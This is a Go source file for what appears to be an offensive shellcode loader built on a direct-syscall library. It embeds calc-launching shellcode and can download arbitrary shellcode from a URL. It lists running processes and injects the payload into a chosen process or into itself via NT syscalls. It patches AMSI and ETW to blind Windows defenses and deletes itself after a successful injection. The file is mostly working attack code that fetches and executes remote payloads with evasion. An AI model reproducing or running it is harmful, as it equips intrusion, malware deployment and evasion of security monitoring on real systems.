package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
	"unsafe"

	winapi "github.com/carved4/go-direct-syscall"
	"github.com/carved4/go-direct-syscall/pkg/debug"
)



// getEmbeddedShellcode returns the embedded calc shellcode as bytes
func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
	
	// Convert hex string to bytes
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}



// Process information structure
type ProcessInfo struct {
	Pid  uint32
	Name string
}

// SyscallDumpResult represents the complete syscall dump for JSON export
type SyscallDumpResult struct {
	Timestamp   string                     `json:"timestamp"`
	SystemInfo  SystemInfo                 `json:"system_info"`
	Syscalls    []winapi.SyscallInfo       `json:"syscalls"`
	TotalCount  int                        `json:"total_count"`
}

// SystemInfo holds basic system information for the dump
type SystemInfo struct {
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	NtdllBase    string `json:"ntdll_base"`
}

// downloadPayload downloads shellcode from a URL
func downloadPayload(url string) ([]byte, error) {
	// Create HTTP client with reasonable timeout
	client := &http.Client{
		Timeout: 30 * 1000000000, // 30 seconds
	}
	
	// Make the request
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %v", err)
	}
	defer resp.Body.Close()
	
	// Check response code
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	
	// Read the payload
	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %v", err)
	}
	
	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
	return payload, nil
}

// utf16ToString converts a UTF16 string to Go string
func utf16ToString(ptr *uint16, maxLen int) string {
	if ptr == nil {
		return ""
	}
	
	var result []uint16
	for i := 0; i < maxLen; i++ {
		char := *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + uintptr(i)*2))
		if char == 0 {
			break
		}
		result = append(result, char)
	}
	
	// Simple conversion for ASCII characters
	var str strings.Builder
	for _, char := range result {
		if char < 128 {
			str.WriteByte(byte(char))
		} else {
			str.WriteRune('?') // Replace non-ASCII with ?
		}
	}
	return str.String()
}

// getProcessList retrieves a list of running processes using NtQuerySystemInformation
func getProcessList() ([]ProcessInfo, error) {
	// First call to get required buffer size
	var returnLength uintptr
	status, err := winapi.NtQuerySystemInformation(
		winapi.SystemProcessInformation,
		nil,
		0,
		&returnLength,
	)
	
	if status != winapi.STATUS_INFO_LENGTH_MISMATCH && status != winapi.STATUS_BUFFER_TOO_SMALL {
		return nil, fmt.Errorf("failed to get buffer size: %s", winapi.FormatNTStatus(status))
	}
	
	// Allocate buffer with some extra space
	bufferSize := returnLength + 4096
	buffer := make([]byte, bufferSize)
	
	// Second call to get actual data
	status, err = winapi.NtQuerySystemInformation(
		winapi.SystemProcessInformation,
		unsafe.Pointer(&buffer[0]),
		bufferSize,
		&returnLength,
	)
	
	if err != nil {
		return nil, fmt.Errorf("NtQuerySystemInformation error: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return nil, fmt.Errorf("NtQuerySystemInformation failed: %s", winapi.FormatNTStatus(status))
	}
	
	var processes []ProcessInfo
	offset := uintptr(0)
	processCount := 0
	
	for {
		// Safety check to prevent buffer overflow
		if offset >= uintptr(len(buffer)) {
			break
		}
		
		// Get current process entry
		processInfo := (*winapi.SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
		processCount++
		
		// Extract process name from UNICODE_STRING
		var processName string
		if processInfo.ImageName.Buffer != nil && processInfo.ImageName.Length > 0 {
			maxChars := int(processInfo.ImageName.Length / 2) // Length is in bytes, convert to chars
			if maxChars > 260 { // MAX_PATH protection
				maxChars = 260
			}
			processName = utf16ToString(processInfo.ImageName.Buffer, maxChars)
		} else {
			// Handle System Idle Process (PID 0) which has no name
			if processInfo.UniqueProcessId == 0 {
				processName = "System Idle Process"
			} else {
				processName = fmt.Sprintf("Process_%d", processInfo.UniqueProcessId)
			}
		}
		

		
		// Skip System Idle Process (PID 0) but include all others
		if processInfo.UniqueProcessId != 0 && processName != "" {
			// Try to open the process to check if we have access
			// Use a more permissive access check - try different access levels
			var processHandle uintptr
			clientId := winapi.CLIENT_ID{
				UniqueProcess: processInfo.UniqueProcessId,
				UniqueThread:  0,
			}
			
			// Initialize OBJECT_ATTRIBUTES to NULL equivalent
			objAttrs := winapi.OBJECT_ATTRIBUTES{
				Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
			}
			
			// Try with limited access first
			status, _ := winapi.NtOpenProcess(
				&processHandle,
				winapi.PROCESS_QUERY_LIMITED_INFORMATION,
				uintptr(unsafe.Pointer(&objAttrs)),
				uintptr(unsafe.Pointer(&clientId)),
			)
			
			// If that fails, try with even more limited access
			if status != winapi.STATUS_SUCCESS {
				status, _ = winapi.NtOpenProcess(
					&processHandle,
					winapi.PROCESS_QUERY_INFORMATION,
					uintptr(unsafe.Pointer(&objAttrs)),
					uintptr(unsafe.Pointer(&clientId)),
				)
			}
			
			// If that still fails, just add the process anyway (we know it exists)

			if status == winapi.STATUS_SUCCESS {
				winapi.NtClose(processHandle)
			}
			

			
			// Add process to list even if we can't access it for injection
			// We'll check access again when actually trying to inject
			processes = append(processes, ProcessInfo{
				Pid:  uint32(processInfo.UniqueProcessId),
				Name: processName,
			})
		}
		
		// Move to next entry
		if processInfo.NextEntryOffset == 0 {
			break
		}
		offset += uintptr(processInfo.NextEntryOffset)
	}
	

	
	// Sort processes by name for easier readability
	sort.Slice(processes, func(i, j int) bool {
		return processes[i].Name < processes[j].Name
	})
	
	return processes, nil
}

// isProcessRunning checks if a process is still running using NtQueryInformationProcess
func isProcessRunning(pid uint32) error {
	// Open the process
	var processHandle uintptr
	clientId := winapi.CLIENT_ID{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}
	
	// Initialize OBJECT_ATTRIBUTES properly
	objAttrs := winapi.OBJECT_ATTRIBUTES{
		Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
	}
	
	status, err := winapi.NtOpenProcess(
		&processHandle,
		winapi.PROCESS_QUERY_LIMITED_INFORMATION,
		uintptr(unsafe.Pointer(&objAttrs)),
		uintptr(unsafe.Pointer(&clientId)),
	)
	
	if err != nil {
		return fmt.Errorf("failed to open process for verification: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("failed to open process: %s", winapi.FormatNTStatus(status))
	}
	
	defer winapi.NtClose(processHandle)
	
	// Query basic process information
	var processInfo winapi.PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	
	status, err = winapi.NtQueryInformationProcess(
		processHandle,
		winapi.ProcessBasicInformation,
		unsafe.Pointer(&processInfo),
		unsafe.Sizeof(processInfo),
		&returnLength,
	)
	
	if err != nil {
		return fmt.Errorf("failed to query process information: %v", err)
	}
	
	if status != winapi.STATUS_SUCCESS {
		return fmt.Errorf("process query failed: %s", winapi.FormatNTStatus(status))
	}
	
	// If we can query the process, it's running
	// The ExitStatus would be non-zero if the process had exited
	return nil
}



func main() {

	// Prewarm the syscall cache :3
	if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
		debug.Printfln("MAIN", "Warning: Failed to prewarm cache: %v\n", cacheErr)
	}

	
	// Display cache statistics
	stats := winapi.GetSyscallCacheStats()
	debug.Printfln("MAIN", "Syscall cache initialized - Size: %v, Algorithm: %v\n", 
		stats["cache_size"], stats["hash_algorithm"])
	
	// Parse command line flags
	urlFlag := flag.String("url", "", "URL to download shellcode from")
	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode (uses self-injection by default)")
	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
	selfFlag := flag.Bool("self", false, "Use self-injection instead of remote process injection")
	debugFlag := flag.Bool("debug", false, "Enable debug logging for all operations")

	flag.Parse()

	// Enable debug mode if requested
	if *debugFlag {
		debug.SetDebugMode(true)
		debug.Printfln("MAIN", "Debug mode enabled\n")
	}

	// Check if dump flag is used
	if *dumpFlag {
		debug.Printfln("MAIN", "Dumping all available syscalls from ntdll.dll...\n")
		debug.Printfln("MAIN", "%s\n", "=" + strings.Repeat("=", 79))
		
		// Demonstrate NT Status code formatting
		debug.Printfln("MAIN", "\nNT Status Code Examples:\n")
		debug.Printfln("MAIN", "------------------------\n")
		exampleStatuses := []uintptr{
			winapi.STATUS_SUCCESS,
			winapi.STATUS_INFO_LENGTH_MISMATCH,
			winapi.STATUS_INVALID_HANDLE,
			winapi.STATUS_INVALID_PARAMETER,
			winapi.STATUS_ACCESS_DENIED,
			winapi.STATUS_NO_MEMORY,
			0xC0000005, // STATUS_ACCESS_VIOLATION
			0xC000001C, // STATUS_INVALID_PARAMETER_1
		}
		
		for _, status := range exampleStatuses {
			debug.Printfln("MAIN", "  %s\n", winapi.FormatNTStatus(status))
		}
		debug.Printfln("MAIN", "\n")
		
		syscalls, err := winapi.DumpAllSyscallsWithFiles()
		if err != nil {
			debug.Printfln("MAIN", "Failed to dump syscalls: %v\n", err)
			os.Exit(1)
		}
		
		// Sort syscalls by syscall number for better readability
		sort.Slice(syscalls, func(i, j int) bool {
			return syscalls[i].SyscallNumber < syscalls[j].SyscallNumber
		})
		
		// Display to console
		debug.Printfln("MAIN", "%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
		debug.Printfln("MAIN", "%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
		
		for _, sc := range syscalls {
			debug.Printfln("MAIN", "%-4d %-40s 0x%-10X 0x%-14X\n", 
				sc.SyscallNumber, sc.Name, sc.Hash, sc.Address)
		}
		
		debug.Printfln("MAIN", "\nTotal syscalls found: %d\n", len(syscalls))
		
		// Prepare data for JSON export
		ntdllBase := "0x0"
		if len(syscalls) > 0 {
			// Calculate ntdll base from first syscall address (rough estimate)
			firstAddr := syscalls[0].Address
			// Round down to nearest 64KB boundary (typical DLL alignment)
			baseAddr := firstAddr &^ 0xFFFF
			ntdllBase = fmt.Sprintf("0x%X", baseAddr)
		}
		
		dumpResult := SyscallDumpResult{
			Timestamp: time.Now().Format("2006-01-02T15:04:05Z07:00"),
			SystemInfo: SystemInfo{
				OS:           "Windows",
				Architecture: "x64",
				NtdllBase:    ntdllBase,
			},
			Syscalls:   syscalls,
			TotalCount: len(syscalls),
		}
		
		// Generate filename with timestamp
		filename := fmt.Sprintf("syscall_dump_%s.json", time.Now().Format("20060102_150405"))
		
		// Marshal to JSON with proper indentation
		jsonData, err := json.MarshalIndent(dumpResult, "", "  ")
		if err != nil {
			debug.Printfln("MAIN", "Failed to marshal JSON: %v\n", err)
			os.Exit(1)
		}
		
		// Write to file
		err = os.WriteFile(filename, jsonData, 0644)
		if err != nil {
			debug.Printfln("MAIN", "Failed to write JSON file: %v\n", err)
			os.Exit(1)
		}
		
		debug.Printfln("MAIN", "\n✓ Syscall dump saved to: %s\n", filename)
		debug.Printfln("MAIN", "✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
		return
	}

	var payload []byte
	var err error

	// Check if example flag is used
	if *exampleFlag {
		// Embedded calc shellcode
		payload = getEmbeddedShellcode()
		debug.Printfln("MAIN", "Using embedded calc shellcode (%d bytes)\n", len(payload))
		debug.Printfln("MAIN", "NT Status formatting enabled: Success = %s\n", winapi.FormatNTStatus(winapi.STATUS_SUCCESS))
	} else {
		// Check if URL is provided
		url := *urlFlag
		if url == "" {
			// This is an error condition, so we always show it regardless of debug mode
			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
			fmt.Println("Usage:")
			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin                    # Remote injection")
			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin -self             # Self injection")
			fmt.Println("  ./go-direct-syscall.exe -example                                              # Self injection with embedded calc")
			fmt.Println("  ./go-direct-syscall.exe -dump                                                 # Dump syscalls")
			fmt.Println("  ./go-direct-syscall.exe -debug -example                                       # Self injection with debug logging")
			os.Exit(1)
		}
		
		// Download the payload
		payload, err = downloadPayload(url)
		if err != nil {
			// This is an error condition, so we always show it regardless of debug mode
			fmt.Printf("Failed to download payload: %v\n", err)
			return
		}
	}
	
	// Determine injection method: self-injection or remote injection
	useSelfInjection := *exampleFlag || *selfFlag // Default to self-injection for example mode
	
	var selectedProcess ProcessInfo
	
	if useSelfInjection {
		debug.Printfln("MAIN", "Using self-injection mode\n")
	} else {
		// Remote injection mode - get process list and let user select
		allProcesses, err := getProcessList()
		if err != nil {
			debug.Printfln("MAIN", "Failed to get process list: %v\n", err)
			return
		}
		
		// Filter out system processes for cleaner user experience
		systemProcesses := []string{
			"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
			"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe",
			"fontdrvhost.exe", "sihost.exe", "taskhostw.exe", "conhost.exe",
			"dllhost.exe", "ctfmon.exe", "perfhost.exe", "audiodg.exe",
			"runtimebroker.exe", "searchindexer.exe", "searchfilterhost.exe",
			"searchprotocolhost.exe", "searchapp.exe", "startmenuexperiencehost.exe",
			"shellexperiencehost.exe", "textinputhost.exe", "applicationframehost.exe",
			"wmiprvse.exe", "vssvc.exe", "registry", "secure system",
			"lsaiso.exe", "credentialenrollmentmanager.exe", "compkgsrv.exe",
		}
		
		var processes []ProcessInfo
		for _, proc := range allProcesses {
			isSystem := false
			for _, sysProc := range systemProcesses {
				if strings.EqualFold(proc.Name, sysProc) {
					isSystem = true
					break
				}
			}
			if !isSystem {
				processes = append(processes, proc)
			}
		}
		
		if len(processes) == 0 {
			debug.Printfln("MAIN", "No user processes found.\n")
			return
		}
		
		fmt.Printf("Using remote injection mode - showing %d user processes\n", len(processes))
		
		// Display process list for manual selection
		fmt.Printf("\nAvailable processes:\n")
		fmt.Printf("-------------------\n")
		for i, proc := range processes {
			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
		}
		
		// Prompt user to select a process
		var selectedIndex int
		var processHandle uintptr
		var status uintptr
		
		for {
			fmt.Printf("\nEnter process number to inject into (or 'q' to quit): ")
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				input := strings.TrimSpace(scanner.Text())
				
				// Check for quit command
				if input == "q" || input == "Q" {
					fmt.Println("Operation cancelled by user")
					return
				}
				
				// Parse the input
				index, err := strconv.Atoi(input)
				if err != nil || index < 1 || index > len(processes) {
					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
					continue
				}
				
				selectedIndex = index - 1
				selectedProcess = processes[selectedIndex]
				
				// Try to open the process to verify access
				clientId := winapi.CLIENT_ID{
					UniqueProcess: uintptr(selectedProcess.Pid),
					UniqueThread:  0,
				}
				
				objAttrs := winapi.OBJECT_ATTRIBUTES{
					Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
				}
				
				desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | winapi.PROCESS_VM_OPERATION | winapi.PROCESS_VM_WRITE | winapi.PROCESS_VM_READ | winapi.PROCESS_QUERY_INFORMATION)
				
				status, err = winapi.NtOpenProcess(
					&processHandle,
					desiredAccess,
					uintptr(unsafe.Pointer(&objAttrs)),
					uintptr(unsafe.Pointer(&clientId)),
				)
				
				if status == winapi.STATUS_SUCCESS {
					break // Successfully opened process, proceed with injection
				}
				
				// Handle access denied or other errors
				if status == winapi.STATUS_ACCESS_DENIED {
					fmt.Printf("\nAccess denied to process %s (PID: %d). Please select a different process.\n", selectedProcess.Name, selectedProcess.Pid)
				} else {
					fmt.Printf("\nFailed to open process %s (PID: %d): %s\n", selectedProcess.Name, selectedProcess.Pid, winapi.FormatNTStatus(status))
				}
				
				// Re-display the process list for convenience
				fmt.Printf("\nAvailable processes:\n")
				fmt.Printf("-------------------\n")
				for i, proc := range processes {
					fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
				}
				continue
			}
			
			if err := scanner.Err(); err != nil {
				fmt.Printf("Error reading input: %v\n", err)
				return
			}
		}
		
		// Successfully selected and opened process
		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
		
		// Ensure we close the process handle when done
		defer winapi.NtClose(processHandle)
		
		// Remote injection - first need to open the process
		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
		fmt.Printf("Payload size: %d bytes\n", len(payload))
		
		// Call remote injection func and patch amsi/etw 
		winapi.ApplyCriticalPatches()
		err = winapi.NtInjectRemote(processHandle, payload)
		
		if err != nil {
			fmt.Printf("Remote injection failed: %v\n", err)
		} else {
			fmt.Printf("Remote injection Successful\n")
			winapi.SelfDel()
		}
	}

	// Perform the injection based on selected method
	if useSelfInjection {
		// Self-injection
		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
		// apply all patches here because fuck it we fixed it
		winapi.ApplyAllPatches()
		err = winapi.NtInjectSelfShellcode(payload)
		
		if err != nil {
			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
		} else {
			debug.Printfln("MAIN", "Self-injection Successful\n")
			winapi.SelfDel()
		}
	}
}
